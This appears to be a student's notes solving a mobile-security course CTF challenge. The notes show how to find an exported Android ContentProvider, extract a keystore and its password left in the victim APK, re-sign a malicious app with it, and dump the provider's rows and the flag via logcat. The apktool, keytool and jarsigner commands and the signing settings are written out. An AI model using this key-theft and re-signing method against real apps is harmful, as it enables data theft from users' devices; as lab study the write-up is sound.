# How to solve it 

Complete the challenge by: 
- replacing in the template app provided within the zip file all the ***** symbols with the appropriate ones
- understanding the new security mechanism introduced by the developer

joker provider -> play with content provider (cursors, sql, stuff)


___ 


1. need to fill 

```java
private static final String TAG = "MOBIOTSEC";
static final String PROVIDER_NAME = "***";
static final String TABLE_NAME = "***";
static final String URL = "***";

....

String[] projection = { "***", "***" };

```

need to find it in the victim code 


resources assets 

mobisec.jks key.jks or debug.keystore 

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    android:versionCode="1"
    android:versionName="1.0"
    android:compileSdkVersion="33"
    android:compileSdkVersionCodename="13"
    package="com.example.victimapp"
    platformBuildVersionCode="33"
    platformBuildVersionName="13">
    <uses-sdk
        android:minSdkVersion="26"
        android:targetSdkVersion="32"/>
    <permission
        android:name="com.example.victimapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
        android:protectionLevel="signature"/>
    <uses-permission android:name="com.example.victimapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
    <application
        android:theme="@style/Theme.VictimApp"
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher"
        android:debuggable="true"
        android:allowBackup="true"
        android:supportsRtl="true"
        android:extractNativeLibs="false"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:appComponentFactory="androidx.core.app.CoreComponentFactory">
        <activity
            android:name="com.example.victimapp.MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <provider
            android:name="com.example.victimapp.MyProvider"
            android:enabled="true"
            android:exported="true"
            android:authorities="com.example.victimapp.MyProvider"/>
        <provider
            android:name="androidx.startup.InitializationProvider"
            android:exported="false"
            android:authorities="com.example.victimapp.androidx-startup">
            <meta-data
                android:name="androidx.emoji2.text.EmojiCompatInitializer"
                android:value="androidx.startup"/>
            <meta-data
                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
                android:value="androidx.startup"/>
        </provider>
    </application>
</manifest>
```


1. fill ***
what i need to look for 

PROVIDER_NAME -> look for a tag <provider>
- android:name="com.example.victimapp.MyProvider"
- static final String PROVIDER_NAME = "com.example.victimapp.MyProvider";


table name  & projection 
- its not in the manifest, need to go to the java class com.example.victimapp.MyProvider

```java
public class MyProvider extends ContentProvider {
    static final String COLUMN_AUTHOR = "author";
    static final String COLUMN_JOKE = "joke";
    static final String DATABASE_NAME = "JokeDB";
    private static final int DATABASE_VERSION = 1;
    static final String PROVIDER_NAME = "com.example.victimapp.MyProvider";
    static final String TABLE_NAME = "joke";
    static final int uriCode = 1;
    static final UriMatcher uriMatcher;
    private SQLiteDatabase db;
    static final String URL = "content://com.example.victimapp.MyProvider/joke";
    static final Uri CONTENT_URI = Uri.parse(URL);
```



static final String PROVIDER_NAME = "com.example.victimapp.MyProvider";
static final String TABLE_NAME = "joke";

**Formula:** `content://` + `PROVIDER_NAME` + `/` + `TABLE_NAME` 
static final String URL = "content://com.example.victimapp.MyProvider/joke";


for the projection need to look for the colum names: author joke
String[] projection = { "author", "joke" };


2. digital signature check 

- "We know that it is not allowed to have two apps with the same package name, but it is possible to have two or more apps with the same signature..."

sigs = this.getPackageManager().getPackageInfo(this.getPackageName(), PackageManager.GET_SIGNATURES).signatures;

is trying to get the flag, 

it lets you see if your signature matches the victim's signature yet.


so we need to have the same signature : goal 

he forgot some sensitive information in a directory of the app.  -> the password "mobisec" might be useful passwd 


jks -> java keystore file -> .jks file has only one purpose: to digitally sign an app.

# Step 2: Steal the Key (The Heist)

❯ apktool d victim.apk

assets -> mykeys.js 

copy the key into the app folder , drag & drop it 

in the terminal 

keytool -list -v -keystore app/mobisec.jks 
passwd: mobisec 


or gui version 

alias usualy is _> key0 -> keyAlias "key0"

```bash
❯ keytool -list -v -keystore app/mykey.jks 
Enter keystore password:  
Keystore type: PKCS12
Keystore provider: SUN

Your keystore contains 1 entry

Alias name: key0
Creation date: Jul 9, 2023
Entry type: PrivateKeyEntry
Certificate chain length: 1
Certificate[1]:
Owner: C=35121, ST=italy, L=padua, O=unipd, OU=unipd, CN=eleonora losiouk
Issuer: C=35121, ST=italy, L=padua, O=unipd, OU=unipd, CN=eleonora losiouk
Serial number: 1
Valid from: Sun Jul 09 16:29:33 CEST 2023 until: Thu Jul 02 16:29:33 CEST 2048
Certificate fingerprints:
         SHA1: F3:64:2C:26:8D:90:2E:B9:45:9D:1F:82:D6:A4:57:C1:CF:F1:C1:99
         SHA256: 37:AD:F3:81:C1:CB:6F:C0:8B:EA:F6:89:52:BE:2D:D3:45:84:3F:E3:B9:91:62:6E:71:E0:44:C1:BE:5C:4D:D5
Signature algorithm name: SHA256withRSA
Subject Public Key Algorithm: 2048-bit RSA key
Version: 1


*******************************************
*******************************************
```



Generate Signed APK
- there you can see key0


2. The Code for build.gradle (Module: app)

graphical way to do this

file project structure

modules

click on module name app 


signing config on the top 

Store File: Browse and select your mykey.jks file.

Store Password: mobisec

Key Alias: key0

Key Password: mobisec

Signature hashcode malicious: ... (Matching the victim) Author: elosiouk Joke: FLAG{Homo_faber_fortunae_suae} Flag: FLAG{Homo_faber_fortunae_suae}

sign both apps with the key 


problem with the victimapp thats not signed 


jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore mobisec.jks victim.apk key0



```bash
2026-01-27 23:57:59.788 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Signature hashcode malicious: -277588092
2026-01-27 23:57:59.788 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Cursor Query Start
2026-01-27 23:57:59.974 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Cursor Query Done
2026-01-27 23:57:59.974 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: 0NoHtE
2026-01-27 23:57:59.974 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: mgSehB
2026-01-27 23:57:59.974 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: 2PUsKU
2026-01-27 23:57:59.974 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: 1Mrj51
2026-01-27 23:57:59.974 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: 0NoHtE
2026-01-27 23:57:59.974 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: mgSehB
2026-01-27 23:57:59.974 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: 2PUsKU
2026-01-27 23:57:59.974 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: 1Mrj51
2026-01-27 23:57:59.974 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: 2rGjhL
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: qw3L4C
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: 3mVGKb
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: gaRaQG
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: 4SFNbG
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: rnMWvZ
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: 6aTVgl
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: 0vybRn
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: 8DAowt
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: 7az8oj
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: AR2XJM
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: QYKJwE
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: BAC1R3
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: XWO7ii
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: BAFEBq
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: 5IB80Z
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: CRAsXY
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: WZsiMf
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: DFFFDm
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: if9aAa
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: EsNTKA
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: ZpPEBe
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: FN8euy
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: PbNnOS
2026-01-27 23:57:59.975 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: FN8euy
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: UmbXVR
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: FvfHHq
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: W3ao4i
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: HqDHF7
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: 70MudB
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: IvgUC3
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: Xh3C4q
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: Ky9Sjg
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: KxTMTl
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: LXisay
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: DD8Sno
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: MKdRId
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: x5llk9
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: MScG7g
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: bXPlED
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: NPsxQF
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: 4cIJPr
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: OYrIIs
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: nifYDC
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: PP7ioC
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: sfWQ4k
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: QYIf9W
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: JvT02S
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: R5HaSj
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: onaite
2026-01-27 23:57:59.976 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: RpweHL
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: MIOy0g
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: TVxjVS
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: cEsij0
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: U8EYcc
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: HdzEQo
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: UkGlOp
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: Snilsv
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: VY3ebX
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: 5HhIdC
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: Vj7gIx
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: vJAOfv
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: WURo1J
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: Mgyuw7
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: YQTQ63
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: q1wvgZ
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: YwqLXH
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: CKSaDh
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: Z8WOEv
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: 4OoEYn
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: ZU7Qm4
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: 8kW7WJ
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: aTdi4a
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: tVhP7d
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: aZuYVW
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: bZiFsv
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: cCUYtS
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: trVyOk
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: cEj6w7
2026-01-27 23:57:59.977 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: 1Pjj3B
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: cX6CO7
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: Snt9Rd
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: ceDKUj
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: zCvltI
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: etUCvw
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: KLTk6X
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: fkZ7b5
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: 9LSmUd
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: iFUIbF
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: ggt5hV
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: ilYDs2
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: Ulx7oa
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: imWA8w
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: igd3x9
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: jENbAH
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: Ojikf7
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: jnyVNP
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: d5aBg3
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: kNOh1J
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: i27u8h
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: lZX24Y
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: 3A8aTi
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: lvz9p1
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: 4lG7nu
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: mNFlDw
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: sYMlgH
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: ne4tcA
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: MsA91m
2026-01-27 23:57:59.978 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: nyMI1z
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: yEijJ1
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: RqPLE
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: O3jTfG
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: elosiouk
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: FLAG{Homo
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: elosiouk
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: _faber_
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: elosiouk
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: fortunae_
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: elosiouk
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: suae}
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: s4ddQd
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: xwx7on
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: s4ddQd
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: Aa3Sdx
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: sx3GNi
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: 9wLFgG
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: tw7iTK
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: JgEO6D
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: wzgS7s
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: cLD1LW
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: xKxE5D
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: wYU4h3
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: y59cO1
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: mxjYsB
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Author: z6fTvN
2026-01-27 23:57:59.979 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Joke: 2nAS26
2026-01-27 23:58:00.047 22090-22090 MOBIOTSEC               com.example.maliciousapp             I  Flag: FLAG{Homo_faber_fortunae_suae}
```